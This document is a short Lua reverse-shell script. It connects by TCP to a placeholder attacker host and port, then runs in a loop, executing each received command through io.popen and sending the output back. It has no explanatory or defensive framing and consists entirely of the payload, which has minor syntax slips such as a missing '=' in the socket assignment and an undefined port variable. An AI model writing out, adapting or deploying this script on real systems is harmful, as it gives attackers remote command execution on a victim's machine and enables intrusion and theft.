local socket = require("socket")

local host, port = "attacker_ip", attacker_port

local tcp assert(socket.tcp())

tcp:connect(host, port)

local cmd =(package.config:sub (1,1) == '\\') and "cmd.exe" or "/bin/sh"

while true do

local input = tcp:receive()

local handle= io.popen(input, 'r')

local result= handle:read("*a")

tcp:send(result)

handle:close()

end